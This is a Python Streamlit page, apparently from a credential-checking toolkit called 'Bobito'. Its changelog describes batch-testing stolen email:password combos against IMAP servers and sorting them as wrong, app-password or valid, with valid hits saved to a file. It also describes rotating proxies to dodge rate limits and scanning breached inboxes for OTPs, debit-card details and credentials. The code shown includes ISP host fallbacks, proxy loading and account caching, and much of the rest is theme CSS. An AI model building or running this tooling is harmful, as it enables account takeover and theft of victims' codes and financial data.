# @@BLOCK 000 FILE_HEADER deps=-
"""
pages/3_Mailbox_Reader.py — Bobito Mailbox Reader & Portal Hub  (v13.39)
=======================================================================
Interactive inbox inspection: bot intelligence, OTP / debit-card / credential
scanning, multi-field search, Telegram + blacklist filtering.

v13.39 fixes on this page
-------------------------
* LOGIN_DROPPED exists here now.  The engine learned in v13.38 that a server
  which ACCEPTS the LOGIN command and then closes the socket with an untagged
  "* BYE" has spoken — but this page had no idea, so it filed the drop as a
  plain FAILED.  _looks_like_login_drop() is tested BEFORE the FAILED
  fall-through and the row is reported as LOGIN_DROPPED ("password still
  untested"), with the rate-limit wording (* BYE Too many ...) excluded so a
  connection cap stays FAILED.
* ALLOW_SELF_SIGNED IS READ.  app_config["allow_self_signed"] existed and was
  never used: both the implicit and the STARTTLS rung hardcoded verify=False,
  so a self-signed toggle in this page did nothing.
* THE PROXY PROBE TRIES HTTP AS WELL AS SOCKS5.  _reader_proxy_reachable() was
  SOCKS5-only while _raw_socket() right below it happily speaks HTTP, so every
  HTTP-only node was binned before it was ever tried.
* THE PROBE IS CHEAPER: 5 nodes at 3s instead of 8 nodes at 5s (up to 40s of
  stall before the reader even connected).
* THE PHONE LAYOUT IS FIXED: Streamlit's 6rem/10rem .block-container padding is
  overridden, there are @media queries, and the sidebar starts collapsed.

v13.37 fixes on this page
-------------------------
* Renamed 1_Mailbox_Reader.py -> 3_Mailbox_Reader.py (page-number collision).
* st.set_page_config() hoisted to be the FIRST Streamlit call, before any
  module-level work, as Streamlit requires.
* MsTokenRejected.verdict was thrown away, so a KNOWN-wrong Microsoft password
  fell through to basic auth and was reported as APPASS.  The reader now raises
  MsVerdict("WRONG" | "APPASS") and STOPS host-hopping on a definitive answer.
* open_imap() gated the STARTTLS / plaintext rungs on int(port) == 993, so a
  port-143 account dialled implicit TLS on 143 and then gave up.  The ladder is
  built from the configured port.
* The batch importer PREPENDED to clean_valid_accounts.txt while app.py
  OVERWROTE it.  Both sides merge now, deduped by email.
* load_valid() and generate_all_mail_zip() are mtime-cached; IMAP-UTF7 decode is
  memoised.
* The proxy is probed and rotated instead of blindly taking pool[0], and the
  path actually used is reported.
* Mass Bot Purge says what it really is: a per-term SERVER search + expunge, not
  a purge of the listed rows only.
"""

import streamlit as st
import imaplib
import glob
import os
import re
import html
import base64
import math
import time
import socket
import ssl as _ssl
import zipfile
import io
import json
from urllib.parse import urlparse
from datetime import datetime
from typing import List, Tuple
from email.header import decode_header
from email import message_from_bytes
# @@END 000


# @@BLOCK 001 PAGE_CONFIG deps=000
# --- Page Config (MUST be the first Streamlit call) ---   # v13.37: hoisted
st.set_page_config(
    page_title="Bobito Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    # v13.39: "expanded" covers the whole viewport on a phone.
    initial_sidebar_state="collapsed"
)
# @@END 001


# @@BLOCK 002 HOSTS_IMPORT deps=001
try:
    from hosts import host_list
except ImportError:
    def host_list(email: str) -> List[str]:
        domain = email.split("@")[-1].lower() if "@" in email else ""
        return [f"imap.{domain}"] if domain else ["imap.gmail.com"]
# @@END 002


# @@BLOCK 003 MS_OAUTH_IMPORT deps=001
# --- ms_oauth.py : Microsoft XOAUTH2 (personal accounts) --------------------
try:
    import ms_oauth as _ms_oauth
    _MS_OAUTH_OK = True
    _MS_IMAP_HOSTS = set(_ms_oauth.MS_IMAP_HOSTS)
except Exception:
    _ms_oauth = None
    _MS_OAUTH_OK = False
    _MS_IMAP_HOSTS = {"outlook.office365.com", "imap-mail.outlook.com"}
# @@END 003


# @@BLOCK 004 MSVERDICT_CLASS deps=000
# ============================================================================
# v13.37: a DEFINITIVE Microsoft answer must not be softened into APPASS
# ============================================================================
class MsVerdict(Exception):
    """Raised when Microsoft gave a definitive answer.

    verdict == "WRONG"   -> the password is wrong; stop host-hopping.
    verdict == "APPASS"  -> MFA is on; an app password is required.
    """

    def __init__(self, verdict, detail=""):
        super().__init__(detail or verdict)
        self.verdict = verdict
        self.detail = detail or verdict
# @@END 004


# @@BLOCK 005 PROVIDER_KNOWLEDGE deps=000
# ============================================================================
# PROVIDER KNOWLEDGE  (legacy ISP domains whose MX != their IMAP host)
# ============================================================================

PROVIDER_FALLBACK_HOSTS = {
    "charter.net":     ["mobile.charter.net", "imap.charter.net", "mail.twc.com", "imap.twc.com"],
    "spectrum.net":    ["imap.spectrum.net", "mail.spectrum.net"],
    "twc.com":         ["mail.twc.com", "imap.twc.com"],
    "rr.com":          ["mail.twc.com", "imap.rr.com"],
    "roadrunner.com":  ["mail.twc.com", "imap.rr.com"],
    "brighthouse.com": ["mail.twc.com"],
    "verizon.net":     ["imap.aol.com", "imap.verizon.net"],
    "att.net":         ["imap.mail.att.net", "imap.att.net"],
    "sbcglobal.net":   ["imap.mail.att.net", "imap.att.net"],
    "bellsouth.net":   ["imap.mail.att.net", "imap.att.net"],
    "ameritech.net":   ["imap.mail.att.net", "imap.att.net"],
    "comcast.net":     ["imap.comcast.net"],
    "cox.net":         ["imap.cox.net"],
    "earthlink.net":   ["imap.earthlink.net"],
    "windstream.net":  ["imap.windstream.net"],
    "frontier.com":    ["imap.frontier.com"],
    "frontiernet.net": ["imap.frontier.com"],
    "centurylink.net": ["imap.centurylink.net"],
    "q.com":           ["imap.centurylink.net"],
    "embarqmail.com":  ["imap.centurylink.net"],
    # Latin-America / Spanish-language ISPs (MX is a Zimbra MTA router, so the
    # real endpoint must be supplied here - 'imap.<domain>' does not exist).
    "montevideo.com.uy": ["mail.montevideo.com.uy", "webmail.montevideo.com.uy", "pop3-mvd.montevideo.com.uy"],
    "adinet.com.uy":     ["mail.adinet.com.uy"],
    "antel.com.uy":      ["mail.antel.com.uy"],
    "uy.com":            ["mail.uy.com"],
}

# These have NO standard IMAP endpoint at all (need Bridge / no IMAP).
ZERO_ACCESS_PROVIDERS = {
    "proton.me", "protonmail.com", "pm.me",
    "tuta.com", "tutanota.com", "tuta.io",
}

def candidate_hosts(email_addr: str, override_host: str = "") -> List[str]:
    """Ordered, de-duplicated host candidates. Never returns an empty list."""
    email_addr = (email_addr or "").strip()
    domain = email_addr.split("@")[-1].lower() if "@" in email_addr else ""

    ordered: List[str] = []

    def push(h):
        if h and h not in ordered:
            ordered.append(h)

    if override_host and override_host.strip():
        push(override_host.strip())

    for h in PROVIDER_FALLBACK_HOSTS.get(domain, []):
        push(h)

    try:
        for h in (host_list(email_addr) or []):
            push(h)
    except Exception:
        pass

    if domain:
        push(f"imap.{domain}")
        push(f"mail.{domain}")
        push(f"webmail.{domain}")
        push(f"correo.{domain}")
        push(domain)

    return ordered

def username_candidates(email_addr: str) -> List[str]:
    """Full address first, then the bare local part.

    Legacy ISP servers (Zimbra / cPanel / Dovecot deployments that predate
    full-address logins) authenticate on the local part only.
    """
    email_addr = (email_addr or "").strip()
    if not email_addr:
        return [email_addr]
    out = [email_addr]
    if "@" in email_addr:
        local = email_addr.split("@", 1)[0].strip()
        if local and local.lower() != email_addr.lower():
            out.append(local)
    return list(dict.fromkeys(out))
# @@END 005


# @@BLOCK 006 THEME_DATA deps=000
# ============================================================================
# SHARED THEME ENGINE
# ============================================================================

_THIS_DIR = os.path.dirname(os.path.abspath(__file__))
APP_DIR = os.path.dirname(_THIS_DIR)                      # repo root
THEME_FILE = os.path.join(APP_DIR, "theme.json")

THEME_PRESETS = {
    "Aurora":    {"g1": "#667eea", "g2": "#764ba2", "accent": "#8b5cf6", "accent2": "#22d3ee", "bg": "#0b1020", "panel": "#141b30", "text": "#e6ebff"},
    "Neon":      {"g1": "#f72585", "g2": "#7209b7", "accent": "#f72585", "accent2": "#4cc9f0", "bg": "#0a0118", "panel": "#180a2c", "text": "#f5e9ff"},
    "Ocean":     {"g1": "#2193b0", "g2": "#6dd5ed", "accent": "#38bdf8", "accent2": "#22d3ee", "bg": "#04141c", "panel": "#0a2432", "text": "#e0f7ff"},
    "Emerald":   {"g1": "#11998e", "g2": "#38ef7d", "accent": "#34d399", "accent2": "#a3e635", "bg": "#06140f", "panel": "#0e2519", "text": "#e3ffee"},
    "Sunset":    {"g1": "#ff6b6b", "g2": "#f9a826", "accent": "#fb923c", "accent2": "#ffd166", "bg": "#1a0f0a", "panel": "#2b1a11", "text": "#fff3e6"},
    "Crimson":   {"g1": "#eb3349", "g2": "#f45c43", "accent": "#f43f5e", "accent2": "#fb923c", "bg": "#160609", "panel": "#270c13", "text": "#ffe8ec"},
    "Royal":     {"g1": "#243b55", "g2": "#4b6cb7", "accent": "#60a5fa", "accent2": "#c084fc", "bg": "#070b12", "panel": "#111a28", "text": "#e2e8f5"},
    "Gold":      {"g1": "#b8860b", "g2": "#ffd700", "accent": "#fbbf24", "accent2": "#f59e0b", "bg": "#141005", "panel": "#251d0a", "text": "#fff8dc"},
    "Candy":     {"g1": "#ff9a9e", "g2": "#fecfef", "accent": "#fb7185", "accent2": "#f9a8d4", "bg": "#1a1016", "panel": "#2b1a24", "text": "#fff0f6"},
    "Cyber":     {"g1": "#00f5d4", "g2": "#0077b6", "accent": "#00f5d4", "accent2": "#90e0ef", "bg": "#03060d", "panel": "#0a1220", "text": "#dffffb"},
    "Grape":     {"g1": "#8e2de2", "g2": "#4a00e0", "accent": "#a78bfa", "accent2": "#f472b6", "bg": "#0b0418", "panel": "#180a2b", "text": "#f1e8ff"},
    "Daylight":  {"g1": "#6366f1", "g2": "#06b6d4", "accent": "#4f46e5", "accent2": "#0891b2", "bg": "#f1f5f9", "panel": "#ffffff", "text": "#0f172a"},
    "Mono":      {"g1": "#3f3f46", "g2": "#71717a", "accent": "#a1a1aa", "accent2": "#d4d4d8", "bg": "#0a0a0b", "panel": "#19191c", "text": "#f4f4f5"},
}

DEFAULT_PRESET = "Aurora"

def _lum(hex_color: str) -> float:
    try:
        h = str(hex_color).lstrip("#")
        r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
        return (0.299 * r + 0.587 * g + 0.114 * b) / 255.0
    except Exception:
        return 0.0

def default_theme() -> dict:
    p = THEME_PRESETS[DEFAULT_PRESET]
    return {
        "preset": DEFAULT_PRESET,
        "g1": p["g1"], "g2": p["g2"], "accent": p["accent"], "accent2": p["accent2"],
        "bg": p["bg"], "panel": p["panel"], "text": p["text"],
        "radius": 14, "glow": True, "animate": True, "glass": True, "colorize_logs": True,
    }

def _theme_candidates() -> List[str]:
    cands = [THEME_FILE, os.path.abspath("theme.json")]
    out, seen = [], set()
    for c in cands:
        try:
            ap = os.path.abspath(c)
        except Exception:
            continue
        if ap not in seen:
            seen.add(ap)
            out.append(c)
    return out

def load_theme() -> dict:
    """Same file app.py writes. Falls back to defaults if absent/unreadable."""
    base = default_theme()
    for path in _theme_candidates():
        if not os.path.exists(path):
            continue
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                base.update({k: v for k, v in data.items() if k in base})
                break
        except Exception:
            continue
    return base

def save_theme(th: dict) -> None:
    """Writes back to the shared file so the checker picks the change up too."""
    for path in (_theme_candidates()[:1] or ["theme.json"]):
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(th, f, indent=2)
            return
        except Exception:
            continue

def is_light(th: dict) -> bool:
    return _lum(th.get("bg", "#000000")) > 0.6
# @@END 006


# @@BLOCK 007 THEME_CSS deps=006
def theme_css(th: dict) -> str:
    g1, g2 = th["g1"], th["g2"]
    ac, ac2 = th["accent"], th["accent2"]
    bg, panel, text = th["bg"], th["panel"], th["text"]
    r = int(th.get("radius", 14))
    light = is_light(th)
    border = "rgba(15,23,42,0.14)" if light else "rgba(255,255,255,0.10)"
    soft = "rgba(15,23,42,0.05)" if light else "rgba(255,255,255,0.04)"
    dim = "rgba(15,23,42,0.65)" if light else "rgba(230,235,255,0.70)"

    glass_css = "backdrop-filter: blur(6px);" if th.get("glass", True) else ""
    anim_css = ""
    if th.get("animate", True):
        anim_css = """
    .bb-hero { background-size: 240% 240%; animation: bbShift 14s ease infinite; }
    @keyframes bbShift { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
    """

    return f"""
<style>
    :root {{
        --bb-g1: {g1}; --bb-g2: {g2}; --bb-ac: {ac}; --bb-ac2: {ac2};
        --bb-bg: {bg}; --bb-panel: {panel}; --bb-text: {text}; --bb-r: {r}px;
    }}
    .stApp, [data-testid="stAppViewContainer"], section.main {{ background: {bg} !important; color: {text} !important; }}
    [data-testid="stHeader"] {{ background: transparent !important; }}
    [data-testid="stSidebar"] {{
        background: linear-gradient(180deg, {panel} 0%, {bg} 100%) !important;
        border-right: 1px solid {border};
    }}
    [data-testid="stSidebar"] * {{ color: {text}; }}
    h1, h2, h3, h4, h5, h6 {{ color: {text} !important; letter-spacing: .2px; }}
    p, span, label, li, small, strong {{ color: {text}; }}
    hr {{ border-color: {border} !important; }}
    a {{ color: {ac2} !important; }}

    .stButton > button, .stDownloadButton > button, .stFormSubmitButton > button {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: {r}px !important;
        font-weight: 600; transition: all .16s ease;
    }}
    .stButton > button:hover, .stDownloadButton > button:hover {{
        border-color: {ac} !important; transform: translateY(-1px);
        box-shadow: 0 6px 18px {ac}44;
    }}
    .stButton > button[kind="primary"], .stDownloadButton > button[kind="primary"] {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%) !important;
        color: #fff !important; border: none !important;
        box-shadow: 0 8px 22px {g1}66;
    }}
    .stButton > button[kind="primary"]:hover {{ filter: brightness(1.08); }}

    [data-testid="stMetric"] {{
        background: {panel} !important; border: 1px solid {border};
        border-left: 4px solid {ac}; border-radius: {r}px;
        padding: 14px 16px; {glass_css}
    }}
    [data-testid="stMetricValue"] {{ color: {ac} !important; font-weight: 800 !important; }}
    [data-testid="stMetricLabel"] {{ color: {dim} !important; }}

    .stTabs [data-baseweb="tab-list"] {{ gap: 6px; border-bottom: 1px solid {border}; }}
    .stTabs [data-baseweb="tab"] {{
        background: {panel}; border-radius: {r}px {r}px 0 0;
        color: {text} !important; padding: 8px 16px; font-weight: 600;
    }}
    .stTabs [aria-selected="true"] {{
        background: linear-gradient(135deg, {g1}, {g2}) !important; color: #fff !important;
    }}
    .stTabs [data-baseweb="tab-highlight"] {{ background: {ac} !important; }}

    [data-testid="stExpander"] {{
        border: 1px solid {border} !important; border-radius: {r}px !important;
        background: {soft} !important; overflow: hidden;
    }}
    [data-testid="stExpander"] summary {{ color: {text} !important; font-weight: 600; }}

    input, textarea, select, .stTextInput input, .stTextArea textarea,
    .stNumberInput input, .stSelectbox div[data-baseweb="select"] > div {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-baseweb="popover"] div {{ background: {panel} !important; color: {text} !important; }}
    [data-baseweb="tag"] {{ background: {ac}44 !important; color: {text} !important; }}

    .stSlider [data-baseweb="slider"] div[role="slider"] {{ background: {ac} !important; }}
    .stProgress > div > div > div > div {{ background: linear-gradient(90deg, {g1}, {g2}) !important; }}
    [data-baseweb="checkbox"] span, [data-baseweb="toggle"] span {{ border-color: {ac} !important; }}

    code, pre, .stCode, .stCodeBlock, [data-testid="stCodeBlock"] {{
        background: {bg} !important; color: {ac2} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-testid="stDataFrame"] {{ border: 1px solid {border} !important; border-radius: 10px !important; }}

    .bb-hero {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%);
        padding: 26px 32px; border-radius: {r}px; margin-bottom: 18px;
        box-shadow: 0 14px 38px {g1}55; border: 1px solid rgba(255,255,255,.10);
    }}
    .bb-hero h1 {{ color: #fff !important; margin: 0; font-size: 1.85rem; font-weight: 800; }}
    .bb-hero p {{ color: rgba(255,255,255,.94) !important; margin: 8px 0 0 0; font-size: .93rem; }}
    .bb-hero .bb-tags {{ margin-top: 12px; }}
    .bb-tag {{
        display: inline-block; padding: 3px 11px; margin: 0 6px 6px 0;
        border-radius: 999px; font-size: .72rem; font-weight: 700;
        background: rgba(255,255,255,.20); color: #fff !important;
        border: 1px solid rgba(255,255,255,.28);
    }}
    .bb-section {{
        display: flex; align-items: center; gap: 12px;
        margin: 22px 0 12px 0; padding: 11px 18px; border-radius: {r}px;
        background: linear-gradient(90deg, {g1}38 0%, {g1}10 45%, transparent 85%);
        border-left: 4px solid {ac};
    }}
    .bb-section .bb-ico {{ font-size: 1.2rem; }}
    .bb-section .bb-t {{ font-weight: 800; font-size: 1.02rem; color: {text}; }}
    .bb-section .bb-s {{ font-size: .76rem; color: {dim}; margin-left: 8px; }}

    .bb-logbox {{
        background: {bg}; border: 1px solid {border}; border-radius: {r}px;
        padding: 10px 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: .78rem; max-height: 360px; overflow-y: auto;
    }}

    .help-box {{
        background: {panel}; border-left: 3px solid {ac};
        padding: 6px 10px; margin: 2px 0 8px 0;
        font-size: .78rem; color: {text}; opacity: .9;
        border-radius: 4px; line-height: 1.35;
    }}

    ::-webkit-scrollbar {{ width: 10px; height: 10px; }}
    ::-webkit-scrollbar-track {{ background: {bg}; }}
    ::-webkit-scrollbar-thumb {{ background: {g1}88; border-radius: 8px; }}
    ::-webkit-scrollbar-thumb:hover {{ background: {ac}; }}

    /* ---- v13.39 MOBILE FIT ---- */
    .block-container, [data-testid="stMainBlockContainer"] {{
        padding-top: 1.2rem !important;
        padding-bottom: 2rem !important;
    }}
    @media (max-width: 820px) {{
        .block-container, [data-testid="stMainBlockContainer"] {{
            padding: 0.55rem 0.7rem calc(1.3rem + env(safe-area-inset-bottom)) 0.7rem !important;
            max-width: 100% !important;
        }}
        [data-testid="stHeader"] {{ height: 2.1rem; }}
        [data-testid="stToolbar"] {{ right: 0.3rem; }}
        [data-testid="stSidebar"] {{ width: 88vw !important; min-width: 88vw !important; }}
        .bb-hero {{ padding: 14px 16px; border-radius: 12px; margin-bottom: 10px; }}
        .bb-hero h1 {{ font-size: 1.18rem; line-height: 1.25; }}
        .bb-hero p {{ font-size: .76rem; line-height: 1.35; }}
        .bb-tag {{ font-size: .61rem; padding: 2px 8px; margin: 0 4px 4px 0; }}
        .bb-section {{ margin: 14px 0 8px 0; padding: 8px 12px; gap: 8px; }}
        .bb-section .bb-t {{ font-size: .9rem; }}
        .bb-section .bb-s {{ display: block; margin: 2px 0 0 0; font-size: .67rem; }}
        /* the reader's .bb-logbox is a fixed 360px box - vh keeps it on-screen */
        .bb-logbox {{ font-size: .67rem; padding: 8px; max-height: 42vh; }}
        .help-box {{ font-size: .7rem; }}
        [data-testid="stMetric"] {{ padding: 8px 10px; }}
        [data-testid="stMetricValue"] {{ font-size: 1.15rem !important; }}
        [data-testid="stMetricLabel"] {{ font-size: .65rem !important; }}
        .stTabs [data-baseweb="tab"] {{ padding: 6px 10px; font-size: .78rem; }}
        .stTabs [data-baseweb="tab-list"] {{ gap: 2px; }}
        h1 {{ font-size: 1.3rem !important; }}
        h2 {{ font-size: 1.12rem !important; }}
        h3 {{ font-size: 1rem !important; }}
        .stButton > button, .stDownloadButton > button {{ padding: .35rem .5rem; font-size: .8rem; }}
        [data-testid="stDataFrame"] {{ font-size: .72rem; }}
        pre, code, .stCode {{ font-size: .68rem !important; }}
        textarea, input {{ font-size: .8rem !important; }}
    }}
    @media (max-width: 420px) {{
        .block-container {{ padding-left: 0.5rem !important; padding-right: 0.5rem !important; }}
        .bb-hero h1 {{ font-size: 1.05rem; }}
        [data-testid="stMetricValue"] {{ font-size: 1rem !important; }}
        [data-testid="stMetricLabel"] {{ font-size: .6rem !important; }}
    }}
    @media (hover: none) {{
        [data-testid="stSidebarCollapsedControl"] {{ top: .3rem; }}
    }}
    {anim_css}
</style>
"""
# @@END 007


# @@BLOCK 008 UI_HELPERS deps=006
def hero(title: str, subtitle: str = "", tags: List[str] = None) -> None:
    tag_html = "".join(f'<span class="bb-tag">{html.escape(t)}</span>' for t in (tags or []))
    st.markdown(
        f'<div class="bb-hero"><h1>{html.escape(title)}</h1>'
        f'<p>{html.escape(subtitle)}</p><div class="bb-tags">{tag_html}</div></div>',
        unsafe_allow_html=True,
    )

def section(icon: str, title: str, subtitle: str = "") -> None:
    sub = f'<span class="bb-s">{html.escape(subtitle)}</span>' if subtitle else ""
    st.markdown(
        f'<div class="bb-section"><span class="bb-ico">{icon}</span>'
        f'<span class="bb-t">{html.escape(title)}</span>{sub}</div>',
        unsafe_allow_html=True,
    )
# @@END 008


# @@BLOCK 009 PROXY_LOADER deps=000
# Dynamic Proxy Auto-Fetch Engine
def load_app_proxies() -> List[dict]:
    """Proxies come from the same files the checker uses. NO hardcoded IP.

    Returns [] when nothing is configured, so every connection goes direct.
    """
    proxy_files = ["proxies.txt", "proxy_pool.txt", "clean_proxies.txt"]
    dynamic_pool = []

    if st.session_state.get("session_proxies"):
        for p in st.session_state.session_proxies:
            if isinstance(p, dict):
                dynamic_pool.append(p)
            elif isinstance(p, str) and p.strip():
                dynamic_pool.append({"proxy": p.strip(), "country": "Dynamic", "region": "Global", "latency": 350})
        if dynamic_pool:
            return dynamic_pool

    for pfile in proxy_files:
        if os.path.exists(pfile):
            try:
                with open(pfile, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line_str = line.strip()
                        if not line_str or line_str.startswith("#"):
                            continue
                        parts = [x.strip() for x in line_str.replace(",", "|").split("|") if x.strip()]
                        proxy_addr = parts[0]
                        if ":" in proxy_addr:
                            country = parts[2] if len(parts) > 2 else "unknown"
                            region = parts[3] if len(parts) > 3 else "unknown"
                            latency = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 350
                            dynamic_pool.append({
                                "proxy": proxy_addr,
                                "country": country,
                                "region": region,
                                "latency": latency
                            })
            except Exception as ex:
                try:
                    st.session_state.folder_debug_logs.append(f"Proxy load warning: {ex}")
                except Exception:
                    pass
            if dynamic_pool:
                return dynamic_pool

    return dynamic_pool
# @@END 009


# @@BLOCK 010 KEEPALIVE_AND_THEME_APPLY deps=007
st.markdown(
    """
    <script>
    setInterval(function(){
        fetch('/_stcore/health').then(res => {});
    }, 30000);
    </script>
    """,
    unsafe_allow_html=True
)

# --- Load shared theme and inject it (must happen before anything renders) ---
THEME = load_theme()
st.markdown(theme_css(THEME), unsafe_allow_html=True)
# @@END 010


# @@BLOCK 011 SIDEBAR_THEME deps=010
# --- Theme control (writes the same file the checker reads) ---
with st.sidebar.expander("🎨 Theme (synced with checker)", expanded=False):
    _names = list(THEME_PRESETS.keys())

    _seed = {
        "rd_preset": THEME.get("preset", DEFAULT_PRESET) if THEME.get("preset", DEFAULT_PRESET) in _names else DEFAULT_PRESET,
        "rd_g1": THEME["g1"], "rd_g2": THEME["g2"],
        "rd_bg": THEME["bg"], "rd_text": THEME["text"],
    }
    for _k, _v in _seed.items():
        if _k not in st.session_state:
            st.session_state[_k] = _v

    def _rd_apply_preset():
        p = THEME_PRESETS.get(st.session_state.get("rd_preset"))
        if p:
            st.session_state["rd_g1"] = p["g1"]
            st.session_state["rd_g2"] = p["g2"]
            st.session_state["rd_bg"] = p["bg"]
            st.session_state["rd_text"] = p["text"]

    st.selectbox("Preset Gradient", _names, key="rd_preset", on_change=_rd_apply_preset)

    _ca, _cb = st.columns(2)
    with _ca:
        st.color_picker("Gradient Start", key="rd_g1")
        st.color_picker("Background", key="rd_bg")
    with _cb:
        st.color_picker("Gradient End", key="rd_g2")
        st.color_picker("Body Text", key="rd_text")

    if (
        st.session_state["rd_g1"] != THEME["g1"]
        or st.session_state["rd_g2"] != THEME["g2"]
        or st.session_state["rd_bg"] != THEME["bg"]
        or st.session_state["rd_text"] != THEME["text"]
        or st.session_state.get("rd_preset") != THEME.get("preset")
    ):
        THEME.update({
            "preset": st.session_state.get("rd_preset", DEFAULT_PRESET),
            "g1": st.session_state["rd_g1"], "g2": st.session_state["rd_g2"],
            "bg": st.session_state["rd_bg"], "text": st.session_state["rd_text"],
        })
        save_theme(THEME)
        st.rerun()

    st.caption("Saved to theme.json — the main checker picks it up automatically.")
# @@END 011


# @@BLOCK 012 FILES_AND_CONFIG deps=000
# Persistent Last Account Management & Session Cache
LAST_ACCOUNT_FILE = "last_account.txt"
APP_CONFIG_FILE = "app_config.json"
MANUAL_VALID_FILE = "manual_valid_accounts.txt"
SESSION_CACHE_FILE = "session_cache.json"

DEFAULT_APP_CONFIG = {
    "connection_timeout": 15,
    "imap_port": 993,
    "auto_fallback_probing": True,
    "max_batch_retries": 1,
    "try_starttls": True,
    "try_alt_username": True,
    "allow_self_signed": True,
}

def load_app_config():
    if os.path.exists(APP_CONFIG_FILE):
        try:
            with open(APP_CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                config = DEFAULT_APP_CONFIG.copy()
                config.update(data)
                return config
        except Exception:
            pass
    return DEFAULT_APP_CONFIG.copy()

def save_app_config(config_dict):
    try:
        with open(APP_CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config_dict, f, indent=2)
    except Exception:
        pass

def save_last_account(account_combo):
    try:
        with open(LAST_ACCOUNT_FILE, "w", encoding="utf-8") as f:
            f.write(account_combo)
    except Exception:
        pass

def load_last_account():
    if os.path.exists(LAST_ACCOUNT_FILE):
        try:
            with open(LAST_ACCOUNT_FILE, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception:
            pass
    return ""

def save_session_cache():
    try:
        cache_data = {
            "connected_account_combo": st.session_state.get("connected_account_combo", ""),
            "mb_host": st.session_state.get("mb_host", ""),
            "mb_folders": st.session_state.get("mb_folders", ["INBOX"]),
            "folder_map": st.session_state.get("folder_map", {"INBOX": "INBOX"}),
            "current_page": st.session_state.get("current_page", 1),
            "search_current_page": st.session_state.get("search_current_page", 1),
            "otp_current_page": st.session_state.get("otp_current_page", 1),
            "bot_current_page": st.session_state.get("bot_current_page", 1),
            "bot_filter_mode": st.session_state.get("bot_filter_mode", False),
            "total_matched_count": st.session_state.get("total_matched_count", 0),
            "search_total_matched_count": st.session_state.get("search_total_matched_count", 0),
            "otp_total_matched_count": st.session_state.get("otp_total_matched_count", 0),
        }

        for k_name, key_in_state in [("current_messages", "current_messages"), ("otp_messages", "otp_messages"), ("search_messages", "search_messages")]:
            serialized_list = []
            for m in st.session_state.get(key_in_state, []):
                m_copy = m.copy()
                raw_bytes = m_copy.pop("raw", None)
                if raw_bytes and isinstance(raw_bytes, bytes):
                    m_copy["raw"] = base64.b64encode(raw_bytes).decode("ascii")
                else:
                    m_copy["raw"] = ""
                serialized_list.append(m_copy)
            cache_data[k_name] = serialized_list

        with open(SESSION_CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(cache_data, f)
    except Exception:
        pass

def load_session_cache():
    if os.path.exists(SESSION_CACHE_FILE):
        try:
            with open(SESSION_CACHE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                for k, v in data.items():
                    if k in ["current_messages", "otp_messages", "search_messages"]:
                        deserialized = []
                        for m in v:
                            m_copy = m.copy()
                            raw_val = m_copy.get("raw")
                            if isinstance(raw_val, str) and raw_val:
                                try:
                                    m_copy["raw"] = base64.b64decode(raw_val.encode("ascii"))
                                except Exception:
                                    m_copy["raw"] = b""
                            else:
                                m_copy["raw"] = b""
                            deserialized.append(m_copy)
                        st.session_state[k] = deserialized
                    else:
                        st.session_state[k] = v
        except Exception:
            pass
# @@END 012


# @@BLOCK 013 SESSION_INIT deps=012
# Initialize Session Config
if "app_config" not in st.session_state:
    st.session_state.app_config = load_app_config()

# Initialize Isolated Session State Variables & Restore Session Cache on first load
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
    load_session_cache()

if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "folder_map" not in st.session_state:
    st.session_state.folder_map = {"INBOX": "INBOX"}
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "current_page" not in st.session_state:
    st.session_state.current_page = 1
if "search_current_page" not in st.session_state:
    st.session_state.search_current_page = 1
if "otp_current_page" not in st.session_state:
    st.session_state.otp_current_page = 1
if "bot_current_page" not in st.session_state:
    st.session_state.bot_current_page = 1
if "folder_debug_logs" not in st.session_state:
    st.session_state.folder_debug_logs = []
if "bot_diag_logs" not in st.session_state:
    st.session_state.bot_diag_logs = []
if "search_diag_logs" not in st.session_state:
    st.session_state.search_diag_logs = []
if "otp_diag_logs" not in st.session_state:
    st.session_state.otp_diag_logs = []
if "current_messages" not in st.session_state:
    st.session_state.current_messages = []
if "search_messages" not in st.session_state:
    st.session_state.search_messages = []
if "otp_messages" not in st.session_state:
    st.session_state.otp_messages = []
if "total_matched_count" not in st.session_state:
    st.session_state.total_matched_count = 0
if "search_total_matched_count" not in st.session_state:
    st.session_state.search_total_matched_count = 0
if "otp_total_matched_count" not in st.session_state:
    st.session_state.otp_total_matched_count = 0
if "bot_filter_mode" not in st.session_state:
    st.session_state.bot_filter_mode = False
if "custom_email" not in st.session_state:
    st.session_state.custom_email = ""
if "custom_pass" not in st.session_state:
    st.session_state.custom_pass = ""
if "custom_host" not in st.session_state:
    st.session_state.custom_host = ""
if "batch_results_table" not in st.session_state:
    st.session_state.batch_results_table = []
if "batch_validation_logs" not in st.session_state:
    st.session_state.batch_validation_logs = []
if "batch_stats" not in st.session_state:
    st.session_state.batch_stats = {"valid": 0, "wrong": 0, "appass": 0, "failed": 0}
if "batch_run_meta" not in st.session_state:
    st.session_state.batch_run_meta = None
if "active_mail" not in st.session_state:
    st.session_state.active_mail = None
if "connected_account_combo" not in st.session_state:
    st.session_state.connected_account_combo = ""
if "reader_use_proxy" not in st.session_state:
    st.session_state.reader_use_proxy = False
# @@END 013


# @@BLOCK 014 LOGGERS deps=013
def log(msg):
    st.session_state.mb_log.insert(0, msg)
